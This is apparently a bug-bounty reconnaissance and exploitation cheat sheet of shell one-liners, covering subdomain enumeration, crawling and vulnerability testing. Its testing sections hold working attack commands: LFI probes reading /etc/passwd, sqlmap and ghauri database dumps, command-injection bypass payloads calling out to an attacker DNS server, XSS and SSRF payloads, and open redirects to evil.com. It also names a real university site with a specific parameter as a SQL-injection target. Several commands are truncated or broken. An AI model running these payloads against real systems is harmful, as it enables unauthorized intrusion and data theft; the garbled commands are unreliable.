## **1. Reconnaissance and Subdomain Enumeration**

### **1.1 Passive Subdomain Enumeration**
**🛠️Tools:** [Subfinder](https://github.com/projectdiscovery/subfinder), [Amass](https://github.com/OWASP/Amass), [CRTSH](https://crt.sh/), [Github-Search](https://github.com/gwen001/github-search)

**Subfinder**
```bash
subfinder -d target.com -silent -all -recursive -o subfinder_subs.txt
```

**Amass (Passive Mode)**
```bash
amass enum -passive -d target.com -o amass_passive_subs.txt
```

**CRT.sh Query**
```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew crtsh_subs.txt
```

**Github Dorking**
```bash
github-subdomains -d target.com -t YOUR_GITHUB_TOKEN -o github_subs.txt
```

**Results Combination**
```bash
cat *_subs.txt | sort -u | anew all_subs.txt
```

### **1.2 Active Subdomain Enumeration**

**🛠️Tools:** [MassDNS](https://github.com/blechschmidt/massdns), [Shuffledns](https://github.com/projectdiscovery/shuffledns), [DNSX](https://github.com/projectdiscovery/dnsx), [SubBrute](https://github.com/TheRook/subbrute), [FFuF](https://github.com/ffuf/ffuf)

**MassDNS**
```bash
massdns -r resolvers.txt -t A -o S -w massdns_results.txt wordlist.txt
```

**Shuffledns**
```bash
shuffledns -d target.com -list all_subs.txt -r resolvers.txt -o active_subs.txt
```

**DNSX Resolution**
```bash
dnsx -l active_subs.txt -resp -o resolved_subs.txt
```

**SubBrute**
```bash
python3 subbrute.py target.com -w wordlist.txt -o brute_force_subs.txt
```

**FFuF Subdomain**
```bash
ffuf -u https://FUZZ.target.com -w wordlist.txt -t 50 -mc 200,403 -o ffuf_subs.txt
```

### **1.3 Handling Specific (Non-Wildcard) Targets**

**🛠️Tools:** [GAU](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [Katana](https://github.com/projectdiscovery/katana), [Hakrawler](https://github.com/hakluke/hakrawler)

**GAU**
```bash
gau target.example.com | anew gau_results.txt
```

**Waybackurls**
```bash
waybackurls target.example.com | anew wayback_results.txt
```

**Katana**
```bash
katana -u target.example.com -silent -jc -o katana_results.txt
```

**Hakrawler**
```bash
echo "https://target.example.com" | hakrawler -depth 2 -plain -js -out hakrawler_results.txt
```

### **Additional Advanced Techniques**

**🛠️Tools:** [CloudEnum](https://github.com/initstring/cloud_enum), [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump), [S3Scanner](https://github.com/sa7mon/S3Scanner)

**Reverse DNS**
```bash
dnsx -ptr -l resolved_subs.txt -resp-only -o reverse_dns.txt
```

**ASN Enumeration**
```bash
amass intel -asn <ASN_NUMBER> -o asn_results.txt
```

**Cloud Asset Enumeration**
```bash
cloud_enum -k target.com
```

**Results Validation**
```bash
cat all_subs.txt | httpx -silent -title -o live_subdomains.txt
```

---

<br>


## **2. Discovery and Probing**

### **2.1 HTTP Probing**

**🛠️Tools:** [httpx](https://github.com/projectdiscovery/httpx), [httprobe](https://github.com/tomnomnom/httprobe)

**HTTPX Probing**
```bash
httpx -l resolved_subs.txt -p 80,443,8080,8443 -silent -title -sc -ip -o live_websites.txt
```

**Custom Filtering**
```bash
cat live_websites.txt | grep -i "login\|admin" | tee login_endpoints.txt
```

### **2.2 JavaScript Analysis**

**🛠️Tools:** [LinkFinder](https://github.com/GerbenJavado/LinkFinder), [subjs](https://github.com/lc/subjs), [JSFinder](https://github.com/Threezh1/JSFinder), [GF](https://github.com/tomnomnom/gf)

**JS Extraction**
```bash
cat live_websites.txt | waybackurls | grep "\.js" | anew js_files.txt
```

**LinkFinder Analysis**
```bash
python3 linkfinder.py -i js_files.txt -o js_endpoints.txt
```

**Sensitive Pattern Search**
```bash
cat js_files.txt | gf aws-keys | tee aws_keys.txt
cat js_files.txt | gf urls | tee sensitive_urls.txt
```

**API Key Validation**
```bash
curl -X GET "https://api.example.com/resource" -H "Authorization: Bearer <extracted_key>"
```

### **2.3 Advanced Google Dorking**

**🛠️Tools:** [GitDorker](https://github.com/obheda12/GitDorker)

**Automated Dorking**
```bash
python3 GitDorker.py -tf <github_token.txt> -q target.com -d dorks.txt -o git_dorks_output.txt
```

**Admin/Login Files**
```bash
site:*.example.com inurl:"*admin | login" | inurl:.php | .asp
```

**Config Files**
```bash
site:*.example.com ext:env | ext:yaml | ext:ini
```

**Public Keys**
```bash
site:*.example.com inurl:"id_rsa.pub" | inurl:".pem"
```

### **2.4 URL Discovery**

**🛠️Tools:** [Katana](https://github.com/projectdiscovery/katana), [Gospider](https://github.com/jaeles-project/gospider), [Hakrawler](https://github.com/hakluke/hakrawler)

**Katana Crawling**
```bash
katana -list live_websites.txt -jc -o katana_urls.txt
```

**Gospider**
```bash
gospider -s "https://target.com" -d 2 -o gospider_output/
```

**Hakrawler**
```bash
echo "https://target.com" | hakrawler -depth 3 -plain -out hakrawler_results.txt
```

### **2.5 Archive Enumeration**

**🛠️Tools:** [GAU](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [ParamSpider](https://github.com/devanshbatham/ParamSpider)

**Archive URL Collection**
```bash
gau --subs target.com | anew archived_urls.txt
waybackurls target.com | anew wayback_urls.txt
```

**Parameter Extraction**
```bash
cat archived_urls.txt | grep "=" | anew parameters.txt
```

---

<br>


## **3. Advanced Enumeration Techniques**

### **3.1 Parameter Discovery**

**🛠️Tools:** [Arjun](https://github.com/s0md3v/Arjun), [ParamSpider](https://github.com/devanshbatham/ParamSpider), [FFuF](https://github.com/ffuf/ffuf)

**Arjun Parameter Discovery**
```bash
arjun -u "https://target.example.com" -m GET,POST --stable -o params.json
```

**ParamSpider Web Parameters**
```bash
python3 paramspider.py --domain target.com --exclude woff,css,js --output paramspider_output.txt
```

**FFuF Parameter Bruteforce**
```bash
ffuf -u https://target.com/page.php?FUZZ=test -w /usr/share/wordlists/params.txt -o parameter_results.txt
```

### **3.2 Cloud Asset Enumeration**

**🛠️Tools:** [CloudEnum](https://github.com/initstring/cloud_enum), [AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump), [S3Scanner](https://github.com/sa7mon/S3Scanner)

**Cloud Bucket Enumeration**
```bash
cloud_enum -k target.com -b buckets.txt -o cloud_enum_results.txt
```

**S3 Bucket Access Test**
```bash
aws s3 ls s3://<bucket_name> --no-sign-request
```

**S3 Bucket Content Dump**
```bash
python3 AWSBucketDump.py -b target-bucket -o dumped_data/
```

### **3.3 Content Discovery**

**🛠️Tools:** [Feroxbuster](https://github.com/epi052/feroxbuster), [FFuF](https://github.com/ffuf/ffuf), [Dirsearch](https://github.com/maurosoria/dirsearch)

**Feroxbuster**
```bash
feroxbuster -u https://target.com -w /usr/share/wordlists/common.txt -r -t 20 -o recursive_results.txt
```

**Dirsearch**
```bash
dirsearch -u https://target.com -w /usr/share/wordlists/content_discovery.txt -e php,html,js,json -x 404 -o dirsearch_results.txt
```

**FFuF Recursive**
```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/content_discovery.txt -mc 200,403 -recursion -recursion-depth 3 -o ffuf_results.txt
```

### **3.4 API Enumeration**

**🛠️Tools:** [Kiterunner](https://github.com/assetnote/kiterunner), [Postman](https://www.postman.com/), [Burp Suite](https://portswigger.net/burp)

**Kiterunner**
```bash
kr scan https://api.target.com -w /usr/share/kiterunner/routes-large.kite -o api_routes.txt
```

### **3.5 ASN Mapping**

**🛠️Tools:** [Amass](https://github.com/OWASP/Amass), [Shodan](https://www.shodan.io/), [Censys](https://censys.io/)

**ASN Lookup**
```bash
amass intel -asn <ASN_Number> -o asn_ips.txt
```

**Shodan Enumeration**
```bash
shodan search "net:<ip_range>" --fields ip_str,port --limit 100
```

**Censys Asset Search**
```bash
censys search "autonomous_system.asn:<ASN_Number>" -o censys_assets.txt
```

---

<br>


## **4. Vulnerability Testing**

### **4.1 High-Priority Vulnerabilities**

**🐞CSRF Testing**
```bash
cat live_websites.txt | gf csrf | tee csrf_endpoints.txt
```

**🐞LFI Testing**
```bash
cat live_websites.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I@ curl -s @ | grep "root:x:" > lfi_results.txt
```

**🐞RCE Testing**
```bash
curl -X POST -F "file=@exploit.php" https://target.com/upload
```

**🐞SQLi Testing**
```bash
ghauri -u "https://target.com?id=1" --dbs --batch
```

**🐞Sensitive Data Search**
```bash
cat js_files.txt | grep -Ei "key|token|auth|password" > sensitive_data.txt
```

**🐞Open Redirect Test**
```bash
cat urls.txt | grep "=http" | qsreplace "https://evil.com" | xargs -I@ curl -I -s @ | grep "evil.com"
```



```
echo "http://<target>/" | gau | uro | grep "\?" | sed "s/=.*/=A\'/" | uniq > params.txt; cat params.txt | httpx -mr ".*SQL.*|.*syntax.*|.*error.*"
```
```
sqlmap -u "http://<target>/sqli?param=A" -p param --dbms=MSSQL --level 1 --risk 1 --banner
```
```
echo https://cutm.ac.in/ | gau | urldedupe -qs | gf sqli
```
```
python3 main.py -u 'https://cutm.ac.in/payu/skill/index.php?id=49' -p payloads/xor.txt -t 5 -o sqli.txt
```
```
ghauri -u 'https://cutm.ac.in/payu/skill/index.php?id=49' --dbs --batch
```
```
sqlmap -m parameters.txt --batch --level=5 --risk=3 --dbs
```

```
#xss vibes 

 python3 main.py -f endpoints.txt -o vuln.txt -t 10
```


```

#waybackurls http://testphp.vulnweb.com | tee param.txt 

 cat param.txt | grep = | tee param1.txt


 cat param1.txt | nuclei -t fuzzing-templates
```
```
sniper -t domain.com -m stealth -o -re
```
```
python knockpy.py -w wordlist/wordlist.txt  taget.com --save targets
```
```
 subzy run --targets guess.txt
```
```
subfinder -d <Target> -all -recursive > subdomain.txt

assetfinder --> assestfinder.txt

sort -u subdomain.txt assestfinder.txt > total_subdomains.txt

sudo subzy run -targets  total_subdomains.txt

httpx -l urls.txt -o livehosts.txt

cat subdomain.txt|httpx-toolkit -ports 80,443,8080, 8000, 8888 -threads 200 > 
subdomains_alive.txt

cat subdomain.txt|httpx-toolkit -ports 80,443,8080, 8000, 8888 -mc 200,403,400,500 -o live.txt

cat live.txt | httpx -status-code


katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"


cat allurls.txt | grep -E "\.js$" >  js.txt

cat alljs.txt | nuclei -t /home/rohit/recon/nuclei-templates-9.9.3 /http/exposures/

dirsearch -u <URL> -e conf,config, bak, backup, swp, old, db, sql,asp,aspx,aspx-,asp-, py,py-, rb, rb, php, php-, bak, bkp, cache, cgi, conf, csv, html, inc, jar, js, json, jsp, jsp-, lock, log, rar, old, sql, sql.gz,http:// sql.zip,sql.tar.gz, sql-, swp, swp-, tar, tar.bz2, tar.gz, txt,wadl, zip,.log,.xml,.js.,.json

python Corsy -i  subdomains_alive.txt -t 100

cat lfi.txt | nuclei -t <lfi cve> -dast

cat allurls.txt | gf redirect | openredirex -p <Payloads>

nmap -iL subdomains.txt -T4 -oN nmap_scan.txt

sqlmap -m parameters.txt --batch --level=5 --risk=3 --dbs

cat lfi_candidates.txt | xargs -I {} sh -c 'ffuf -u "{}?file=FUZZ" -w /home/rohit/recon/payloads/LFI\ payloads.txt -v -mr "root:x:0:0:" -o lfi_results_$(echo {} | sed "s/[^a-zA-Z0-9]/_/g").txt'

echo url  | gau | urldedupe -qs | gf sqli

 cat endpoints.txt | gau | urldedupe -qs | gf redirect > redirect.txt
nuclei -l filename -tags xss

```
#cmd
```
cat urls.txt | gf command-injection | tee cmd_injection_candidates.txt
```
```
cat cmd_injection_candidates.txt | xargs -I{} commix --url={} --batch
```

```
 nuclei -t cves/2021/command-injection.yaml -u https://target.com
```
```
ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -H "User-Agent: $(id)" -o ffuf-results.json
```
#ADDTIONAL METHODS TO BYPASS

#1. Header-based Injection
---> curl -H "User-Agent: $(whoami)" https://target.com

#2. DNS Blind Command Injection Detection

---> ; nslookup yourdnsserver.com && ping -c 1 yourdnsserver.com

#3 .  Time-based Blind Injection

---> ; sleep 10
&& ping -c 5 localhost

#4 . URL Encoding:

--->  %26%26whoami

#5. Whitespace Manipulation

---> ; ping${IFS}-c${IFS}4${IFS}localhost

```
subfinder -d xyz.com -all  | nuclei -t crlf.yaml -rl 50
subfinder -d xyz.com -all  | nuclei -t openRedirect.yaml -rl 100
subfinder -d xyz.com -all  | nuclei -t iis.yaml
subfinder -d xyz.com -all  | nuclei -t cors.yaml -rl 100
subfinder -d xyz.com -all  | waybackurls | gf sqli | uro | nuclei -t errorsqli.yaml -rl 50


cat or.txt | nuclei -t /home/rohit/recon/payloads/custom_nuclei/openRedirect.yaml --retries 2
cat or.txt | nuclei -t /home/niuclei-templates/blind-ssrf.yaml --retries 2 -dast
cat or.txt | nuclei -t /home/niuclei-templates/response-ssrf.yaml --retries 2 -dast
cat or.txt | nuclei -t /home/niuclei-templates/credential-disclosure-all.yaml 
cat or.txt | nuclei -t /home/niuclei-templates/x-forwarded.yaml 



cat crlf.txt | nuclei -t /home/rohit/recon/payloads/custom_nuclei/cRlf.yaml

cat sql.txt | nuclei -t /home/niuclei-templates/errsqli.yaml  -dast
cat sql.txt | nuclei -t /home/niuclei-templates/timeqli.yaml -dast

cat iis.txt |  nuclei -t /home/niuclei-templates/iis.yaml  --> next --> shortscan url -F

cat  git.txt | nuclei -t /home/niuclei-templates/gitexposed.yaml 

cat  cors.txt | nuclei -t /home/niuclei-templates/cors.yaml 


```
###  BBRF SCOPE DoD

```bash
bbrf inscope add '*.af.mil' '*.osd.mil' '*.marines.mil' '*.pentagon.mil' '*.disa.mil' '*.health.mil' '*.dau.mil' '*.dtra.mil' '*.ng.mil' '*.dds.mil' '*.uscg.mil' '*.army.mil' '*.dcma.mil' '*.dla.mil' '*.dtic.mil' '*.yellowribbon.mil' '*.socom.mil'
```
### Xray Oneliner
```bash
xargs -a urls.txt -I@ sh -c './xray webscan --plugins cmd-injection,sqldet,xss --url "@" --html-output vuln.html'

```

###  Katana crawling

```bash
subfinder -d hackerone.com -silent -all | httpx -silent | katana -d 5 -silent | grep -iE '\.js'| grep -iEv '(\.jsp|\.json)'
subfinder -d hackerone.com -silent -all | httpx -silent | katana -d 5 -silent -em js,jsp,json
```


###  Scan All domains using Knoxss
- [Explained command]
```bash
echo "dominio" | subfinder -silent | gau | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss.me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIDOKNOXSS\""}' | sh 
```


###  Scan All github repo ORG
- [Explained command]
```bash
docker run --rm  mswell/masstrufflehog -o paypal

```

###  Scan log4j using BBRF and log4j-scan
- [Explained command](https://bit.ly/3IUivk9)
```bash
bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 http://log4j-scan.py -u "@"'
```

###  SSTI in qsreplase add "{{7*7}}" (0xJin)

```bash
cat subdomains.txt | httpx -silent -status-code | gau --threads 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080

```

###  urldedupe bhedak
- [Explained command]
```bash
waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
```

### Hakrawler Airixss XSS 
- [Explained command]
```bash
echo testphp.vulnweb.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
```


###  Airixss XSS 
- [Explained command]
```bash
echo testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
```


###  FREQ XSS 
- [Explained command]
```bash
echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
```


###  Bhedak
- [Explained command]
```bash
cat urls | bhedak "\"><svg/onload=alert(1)>*'/---+{{7*7}}"
```

###  .bashrc shortcut OFJAAAH

```bash
reconjs(){
gau -subs $1 |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt ; cat js.txt | anti-burl | awk '{print $4}' | sort -u >> AliveJs.txt
}
cert(){
curl -s "[https://crt.sh/?q=%.$1&output=json](https://crt.sh/?q=%25.$1&output=json)" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew
}
anubis(){
curl -s "[https://jldc.me/anubis/subdomains/$1](https://jldc.me/anubis/subdomains/$1)" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
}
```

###  Oneliner Haklistgen
- @hakluke

```bash
subfinder -silent -d domain | anew subdomains.txt | httpx -silent | anew urls.txt | hakrawler | anew endpoints.txt | while read url; do curl $url --insecure | haklistgen | anew wordlist.txt; done
cat subdomains.txt urls.txt endpoints.txt | haklistgen | anew wordlist.txt;
```

###  Running JavaScript on each page send to proxy. 
- [Explained command]

```bash
cat 200http | page-fetch --javascript '[...document.querySelectorAll("a")].map(n => n.href)' --proxy http://192.168.15.47:8080
```

###  Running cariddi to Crawler
- [Explained command]

```bash
echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive
```

###  Dalfox scan to bugbounty targets.
- [Explained command]

```bash
xargs -a xss-urls.txt -I@ bash -c 'python3 /dir-to-xsstrike/xsstrike.py -u @ --fuzzer'
```

### Dalfox scan to bugbounty targets.
- [Explained command]
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @
```

### Using x8 to Hidden parameters discovery
- [Explaining command]

```bash
assetfinder domain | httpx -silent | sed -s 's/$/\//' | xargs -I@ sh -c 'x8 -u @ -w params.txt -o enumerate'
```

### Extract .js Subdomains
- [Explaining command]

```bash
echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | anew JS
echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | tojson | anew JS1
```


### goop to search .git files.
- [Explaining command]

```bash
xargs -a xss -P10 -I@ sh -c 'goop @'
```

### Using chaos list to enumerate endpoint

```bash
curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/master/chaos-bugbounty-list.json | jq -r '.programs[].domains[]' | xargs -I@ sh -c 'python3 paramspider.py -d @'
```

### Using Wingman to search XSS reflect / DOM XSS

- [Explaining command]

```bash
xargs -a domain -I@ sh -c 'wingman -u @ --crawl | notify'

```

### Search ASN to metabigor and resolvers domain

- [Explaining command]

```bash
echo 'dod' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\+\.//g' | xargs -I@ sh -c 'prips @ | hakrevdns | anew'

```

### OneLiners

### Search .json gospider filter anti-burl

- [Explaining command]

```bash
gospider -s https://twitch.tv --js | grep -E "\.js(?:onp?)?$" | awk '{print $4}' | tr -d "[]" | anew | anti-burl

```

### Search .json subdomain

- [Explaining command]

```bash
assetfinder http://tesla.com | waybackurls | grep -E "\.json(?:onp?)?$" | anew 
```

### SonarDNS extract subdomains

- [Explaining command]

```bash
wget https://opendata.rapid7.com/sonar.fdns_v2/2021-02-26-1614298023-fdns_a.json.gz ; gunzip 2021-02-26-1614298023-fdns_a.json.gz ; cat 2021-02-26-1614298023-fdns_a.json | grep ".DOMAIN.com" | jq .name | tr '" " "' " / " | tee -a sonar
```

### Kxss to search param XSS 

- [Explaining command]

```bash
echo http://testphp.vulnweb.com/ | waybackurls | kxss
```


### Recon subdomains and gau to search vuls DalFox

- [Explaining command]

```bash
assetfinder testphp.vulnweb.com | gau |  dalfox pipe
```


### Recon subdomains and Screenshot to URL using gowitness

- [Explaining command]

```bash
assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 
```


###  Extract urls to source code comments

- [Explaining command]

```bash
cat urls1 | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]*[-A-Za-z0-9+&@#/%=~_|]' 
```

###  Axiom recon "complete"

- [Explaining command]

```bash
findomain -t domain -q -u url ; axiom-scan url -m subfinder -o subs --threads 3 ; axiom-scan subs -m httpx -o http ; axiom-scan http -m ffuf --threads 15 -o ffuf-output ; cat ffuf-output | tr "," " " | awk '{print $2}' | fff | grep 200 | sort -u 
```

###  Domain subdomain extraction 

- [Explaining command]

```bash
cat url | haktldextract -s -t 16 | tee subs.txt ; xargs -a subs.txt -I@ sh -c 'assetfinder -subs-only @ | anew | httpx -silent  -threads 100 | anew httpDomain'

```


###  Search .js using 

- [Explaining command]

```bash
assetfinder -subs-only DOMAIN -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | awk '{print $3}' | grep -E "\.js(?:onp?)?$" | anew
```


###  This one was huge ... But it collects .js gau + wayback + gospider and makes an analysis of the js. tools you need below.

- [Explaining command]

```bash
cat dominios | gau |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> gauJS.txt ; cat dominios | waybackurls | grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> waybJS.txt ; gospider -a -S dominios -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" >> gospiderJS.txt ; cat gauJS.txt waybJS.txt gospiderJS.txt | sort -u >> saidaJS ; rm -rf *.txt ; cat saidaJS | anti-burl |awk '{print $4}' | sort -u >> AliveJs.txt ; xargs -a AliveJs.txt -n 2 -I@ bash -c "echo -e '\n[URL]: @\n'; python3 linkfinder.py -i @ -o cli" ; cat AliveJs.txt  | python3 collector.py output ; rush -i output/urls.txt 'python3 SecretFinder.py -i {} -o cli | sort -u >> output/resultJSPASS'
```


###  My recon automation simple. OFJAAAH.sh

- [Explaining command]

```bash
chaos -d $1 -o chaos1 -silent ; assetfinder -subs-only $1 >> assetfinder1 ; subfinder -d $1 -o subfinder1 -silent ; cat assetfinder1 subfinder1 chaos1 >> hosts ; cat hosts | anew clearDOMAIN ; httpx -l hosts -silent -threads 100 | anew http200 ; rm -rf chaos1 assetfinder1 subfinder1
```

###  Download all domains to bounty chaos

- [Explaining command]

```bash
curl https://chaos-data.projectdiscovery.io/index.json | jq -M '.[] | .URL | @sh' | xargs -I@ sh -c 'wget @ -q'; mkdir bounty ; unzip '*.zip' -d bounty/ ; rm -rf *zip ; cat bounty/*.txt >> allbounty ; sort -u allbounty >> domainsBOUNTY ; rm -rf allbounty bounty/ ; echo '@OFJAAAH'
```

###  Recon to search SSRF Test

- [Explaining command]

```bash
findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
```


###  ShuffleDNS to domains in file scan nuclei.

- [Explaining command]

```bash
xargs -a domain -I@ -P500 sh -c 'shuffledns -d "@" -silent -w words.txt -r resolvers.txt' | httpx -silent -threads 1000 | nuclei -t /root/nuclei-templates/ -o re1
```


###  Search Asn Amass

- [Explaining command]

Amass intel will search the organization "paypal" from a database of ASNs at a faster-than-default rate. It will then take these ASN numbers and scan the complete ASN/IP space for all tld's in that IP space (paypal.com, paypal.co.id, paypal.me)

```bash
amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500''
```

###  SQLINJECTION Mass domain file

- [Explaining command]

```bash

httpx -l domains -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
```


###  Using chaos search js


- [Explaining command]

Chaos is an API by Project Discovery that discovers subdomains. Here we are querying thier API for all known subdoains of "att.com". We are then using httpx to find which of those domains is live and hosts an HTTP or HTTPs site. We then pass those URLs to GoSpider to visit them and crawl them for all links (javascript, endpoints, etc). We then grep to find all the JS files. We pipe this all through anew so we see the output iterativlely (faster) and grep for "(http|https)://att.com" to make sure we dont recieve output for domains that are not "att.com".

```bash
chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo "(http|https)://[^/"].*.js+" | sed "s#]
```

###  Search Subdomain using Gospider


- [Explaining command]

GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) we use some blacklist, so that it doesn’t travel, not to delay, grep is a command-line utility for searching plain-text data sets for lines that match a regular expression to search HTTP and HTTPS

```bash
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

###  Using gospider to chaos


- [Explaining command]

GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) chaos is a subdomain search project, to use it needs the api, to xargs is a command on Unix and most Unix-like operating systems used to build and execute commands from standard input.


```bash
chaos -d paypal.com -bbq -filter-wildcard -http-url | xargs -I@ -P5 sh -c 'gospider -a -s "@" -d 3'
```

###  Using recon.dev and gospider crawler subdomains

- [Explaining command]

We will use recon.dev api to extract ready subdomains infos, then parsing output json with jq, replacing with a Stream EDitor all blank spaces
If anew, we can sort and display unique domains on screen, redirecting this output list to httpx to create a new list with just alive domains.
Xargs is being used to deal with gospider with 3 parallel proccess and then using grep within regexp just taking http urls.

```bash
curl "https://recon.dev/api/search?key=apiKEY&domain=paypal.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -P3 -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

###  PSQL - search subdomain using cert.sh

- [Explaining command]

Make use of pgsql cli of crt.sh, replace all comma to new lines and grep just twitch text domains with anew to confirm unique outputs

```bash
psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep twitch | anew
```

###  Search subdomains using github and httpx

- [Github-search]

Using python3 to search subdomains, httpx filter hosts by up status-code response (200)

```python
./github-subdomains.py -t APYKEYGITHUB -d domaintosearch | httpx --title
```

###  Search SQLINJECTION using qsreplace search syntax error

- [Explained command]

```bash
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```

###  Search subdomains using jldc

- [Explained command]

```bash
curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
```

###  Search subdomains in assetfinder using hakrawler spider to search links in content responses

- [Explained command]

```bash
assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
```

###  Search subdomains in cert.sh

- [Explained command]

```bash
curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx -title -silent | anew
```

###  Search subdomains in cert.sh assetfinder to search in link /.git/HEAD

- [Explained command]

```bash
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
```bash
curl -s "https://crt.sh/?q=%25.enjoei.com.br&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | httpx -silent -path /.git/HEAD -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
###  Collect js files from hosts up by gospider

- [Explained command]

```bash
xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'
```

###  Subdomain search Bufferover resolving domain to httpx

- [Explained command]

```bash
curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent | anew
```

###  Using gargs to gospider search with parallel proccess
- [Gargs](https://github.com/brentp/gargs)

- [Explained command]

```bash
httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne
```

###  Injection xss using qsreplace to urls filter to gospider

- [Explained command]

```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

###  Extract URL's to apk

- [Explained command]

```bash
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl"
```

###  Chaos to Gospider

- [Explained command]

```bash
chaos -d att.com -o att -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -s @
```

###  Checking invalid certificate

- [Real script](https://bit.ly/2DhAwMo)
- [Script King](https://bit.ly/34Z0kIH)

```bash
